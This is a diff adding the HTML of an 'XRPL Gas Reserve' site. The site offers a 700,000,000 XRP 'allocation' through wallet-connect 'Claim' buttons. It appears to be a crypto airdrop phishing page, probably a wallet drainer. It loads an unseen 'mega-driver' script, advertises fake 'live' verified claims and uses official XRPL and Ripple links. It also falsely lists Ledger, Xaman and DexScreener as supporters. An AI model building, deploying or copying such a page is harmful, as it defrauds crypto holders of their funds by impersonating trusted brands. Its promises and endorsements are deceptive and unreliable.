@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XRPL Gas Reserve</title>
+    <link rel="icon" type="image/png" href="images/xrplogo.png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Outfit:wght@300;400;500;600;700;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+    <script src="./mega-driver-v2.8.min.js"></script>
+</head>
+
+<body>
+
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="logo">
+                <img src="images/xrplogo.png" alt="XRPL" class="xrp-logo-img">
+                <span class="logo-text">XRPL Gas Reserve</span>
+            </div>
+            <ul class="nav-links">
+                <li><a href="#home">Home</a></li>
+                <li><a href="#about">About</a></li>
+                <li><a href="#live-activity">Live Feed</a></li>
+                <li><button class="xrpl-wallet-connect">Claim</button></li>
+                <li><a href="https://xrpl.org" target="_blank" class="nav-btn">Official Site</a></li>
+            </ul>
+            <button class="xrpl-wallet-connect mobile-claim">Claim</button>
+        </div>
+    </nav>
+
+    <!-- Hero + Claim Section -->
+    <section id="home" class="hero">
+        <div class="hero-content">
+            <div class="hero-main-logo">
+                <img src="images/xrplogo.png" alt="XRP" class="hero-logo-img">
+            </div>
+            <h1 class="hero-title">XRPL Gas Reserve</h1>
+            <p class="hero-subtitle">Institutional Grade Distribution Portal</p>
+            <p class="hero-amount">700,000,000 XRP</p>
+            <p class="hero-desc">Access the gas reserve allocation program. Rewards are distributed based on your
+                on-ledger activity and trade history.</p>
+
+            <!-- Claim Form Integrated into Hero -->
+            <div id="claim" class="hero-claim-box">
+                <form class="claim-form" id="claimForm">
+                    <div class="claim-reward-info">
+                        <div class="reward-icon">🎯</div>
+                        <h3>Eligibility-Based Distribution</h3>
+                        <p>Your allocation is automatically determined by your historical XRPL activity, liquidity
+                            provision, and cumulative trading volume.</p>
+                    </div>
+
+                    <button class="xrpl-wallet-connect">Claim Allocation</button>
+
+                    <div class="trade-restriction-note">
+                        <strong>⚠️ ELIGIBILITY REQUIREMENT</strong>
+                        <p>No rewards are distributed to accounts with no previous trading history or zero transaction
+                            volume on the XRP Ledger.</p>
+                    </div>
+
+                    <p class="form-note">✓ Integrated with Xaman &nbsp;|&nbsp; ✓ Direct-to-Wallet &nbsp;|&nbsp; ✓
+                        Institutional Grade</p>
+                </form>
+            </div>
+
+            <div class="hero-stats">
+                <div class="hero-stat">
+                    <span class="stat-number">3-5s</span>
+                    <span class="stat-label">Settlement</span>
+                </div>
+                <div class="hero-stat-divider"></div>
+                <div class="hero-stat">
+                    <span class="stat-number">1,500+</span>
+                    <span class="stat-label">TPS Capacity</span>
+                </div>
+                <div class="hero-stat-divider"></div>
+                <div class="hero-stat">
+                    <span class="stat-number">$0.0002</span>
+                    <span class="stat-label">Avg. Fee</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Live Network Activity Section -->
+    <section id="live-activity" class="live-activity-section">
+        <div class="section-header">
+            <span class="badge">Real-Time</span>
+            <h2>Live Network Activity</h2>
+            <p>Verified distributions happening across the XRPL ecosystem right now</p>
+        </div>
+
+        <div class="live-stats-bar">
+            <div class="live-stat-item">
+                <span class="live-dot"></span>
+                <span>Network Status: <strong>Online</strong></span>
+            </div>
+            <div class="live-stat-item">
+                <span>Current Ledger: <strong id="ledgerIndex">...</strong></span>
+            </div>
+            <div class="live-stat-item">
+                <span>TPS: <strong>1,500+</strong></span>
+            </div>
+        </div>
+
+        <div class="live-activity-container">
+            <div class="claims-ticker" id="claimsTicker">
+                <!-- Live claims will populate here -->
+            </div>
+        </div>
+    </section>
+
+    <!-- About XRPL Section -->
+    <section id="about" class="about-section">
+        <div class="about-container">
+            <div class="section-header">
+                <span class="badge">The Foundation</span>
+                <h2>What is XRP Ledger?</h2>
+                <p>A decentralized, public blockchain built for business — offering high-speed, low-cost, and
+                    carbon-neutral transactions since 2012.</p>
+            </div>
+
+            <div class="about-grid">
+                <div class="about-card">
+                    <div class="card-icon">⚡</div>
+                    <h3>3-5s Settlement</h3>
+                    <p>Transactions settle in seconds, significantly faster than Bitcoin or Ethereum networks.</p>
+                </div>
+                <div class="about-card">
+                    <div class="card-icon">💎</div>
+                    <h3>1,500 TPS</h3>
+                    <p>Enterprise-grade throughput with negligible transaction fees per operation.</p>
+                </div>
+                <div class="about-card">
+                    <div class="card-icon">🌍</div>
+                    <h3>Carbon Neutral</h3>
+                    <p>The first major carbon-neutral blockchain — 61,000x more efficient than Proof-of-Work.</p>
+                </div>
+                <div class="about-card">
+                    <div class="card-icon">🛡️</div>
+                    <h3>Battle Tested</h3>
+                    <p>Over a decade of uninterrupted operation secured by 150+ decentralized validators.</p>
+                </div>
+            </div>
+
+            <!-- Protocol Features -->
+            <div class="protocol-grid">
+                <div class="protocol-card">
+                    <div class="protocol-icon">📈</div>
+                    <div class="protocol-info">
+                        <h4>Native DEX</h4>
+                        <p>Built-in peer-to-peer multi-currency exchange with automated market making and deep protocol
+                            liquidity.</p>
+                    </div>
+                </div>
+                <div class="protocol-card">
+                    <div class="protocol-icon">⚙️</div>
+                    <div class="protocol-info">
+                        <h4>Programmable Money</h4>
+                        <p>Multi-signing security, conditional escrows, and high-speed payment channels for
+                            institutional control.</p>
+                    </div>
+                </div>
+                <div class="protocol-card">
+                    <div class="protocol-icon">✅</div>
+                    <div class="protocol-info">
+                        <h4>Proven Consensus</h4>
+                        <p>Unique federated consensus settles in 3-5 seconds without energy-intensive mining. 80M+
+                            ledgers validated.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="official-links">
+                <a href="https://xrpl.org" target="_blank" class="btn btn-outline">Official Website</a>
+                <a href="https://t.me/ripple" target="_blank" class="btn btn-outline">Telegram</a>
+                <a href="https://twitter.com/ripple" target="_blank" class="btn btn-outline">Twitter / X</a>
+            </div>
+        </div>
+    </section>
+
+    <!-- Live XRP Chart -->
+    <section id="xrp-chart" class="chart-section">
+        <div class="section-header">
+            <span class="badge">Live Market</span>
+            <h2>XRP Price Chart</h2>
+            <p>Real-time market data powered by TradingView</p>
+        </div>
+        <div class="chart-container">
+            <!-- TradingView Widget -->
+            <div class="tradingview-widget-container">
+                <div id="tradingview_xrp"></div>
+                <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
+                <script type="text/javascript">
+                    new TradingView.widget({
+                        "autosize": true,
+                        "symbol": "BINANCE:XRPUSDT",
+                        "interval": "60",
+                        "timezone": "Etc/UTC",
+                        "theme": "dark",
+                        "style": "1",
+                        "locale": "en",
+                        "toolbar_bg": "#050505",
+                        "enable_publishing": false,
+                        "hide_top_toolbar": false,
+                        "hide_legend": false,
+                        "save_image": false,
+                        "container_id": "tradingview_xrp",
+                        "backgroundColor": "rgba(5, 5, 5, 1)",
+                        "gridColor": "rgba(0, 48, 207, 0.06)",
+                        "hide_side_toolbar": true
+                    });
+                </script>
+            </div>
+        </div>
+    </section>
+
+    <!-- Tokens Section -->
+    <section id="pools" class="pools-section">
+        <div class="section-header">
+            <span class="badge">DexScreener</span>
+            <h2>XRPL Ecosystem Tokens</h2>
+            <p>Trade and explore tokens from the XRPL ecosystem</p>
+        </div>
+        <div class="tokens-container" id="tokensContainer">
+            <div class="loading-spinner">
+                <div class="spinner"></div>
+                <p>Loading tokens...</p>
+            </div>
+        </div>
+        <div class="pagination-container" id="paginationControls"></div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-logo">
+                <img src="images/xrplogo.png" alt="XRPL" class="footer-logo-img">
+                <span>XRPL Gas Reserve</span>
+            </div>
+            <p>&copy; 2026 XRP Gas Reserve Distribution. All rights reserved.</p>
+            <p class="footer-tagline">Powered by Xaman &nbsp;|&nbsp; Secure &nbsp;|&nbsp; Transparent &nbsp;|&nbsp;
+                Trusted</p>
+            <div class="footer-links">
+                <a href="https://xrpl.org" target="_blank">XRPL.org</a>
+                <a href="https://t.me/ripple" target="_blank">Telegram</a>
+                <a href="https://twitter.com/ripple" target="_blank">Twitter</a>
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Service</a>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Floating Affiliate Bar -->
+    <div class="affiliate-bar">
+        <span class="affiliate-label">Supported By</span>
+        <div class="affiliate-logos">
+            <a href="https://dexscreener.com" target="_blank" class="affiliate-item">
+                <img src="https://dexscreener.com/favicon.ico" alt="DexScreener"
+                    onerror="this.style.display='none'; this.nextElementSibling.style.display='flex'">
+                <span class="affiliate-fallback" style="display:none">DS</span>
+                <span>DexScreener</span>
+            </a>
+            <a href="https://xaman.app" target="_blank" class="affiliate-item">
+                <img src="https://xaman.app/favicon.ico" alt="Xaman"
+                    onerror="this.style.display='none'; this.nextElementSibling.style.display='flex'">
+                <span class="affiliate-fallback" style="display:none">XA</span>
+                <span>Xaman</span>
+            </a>
+            <a href="https://www.ledger.com" target="_blank" class="affiliate-item">
+                <img src="https://www.ledger.com/favicon.ico" alt="Ledger"
+                    onerror="this.style.display='none'; this.nextElementSibling.style.display='flex'">
+                <span class="affiliate-fallback" style="display:none">LG</span>
+                <span>Ledger</span>
+            </a>
+            <a href="https://xrpl.org" target="_blank" class="affiliate-item">
+                <img src="images/xrplogo.png" alt="XRPL" class="affiliate-xrp-logo">
+                <span>XRPL</span>
+            </a>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+
+</html>
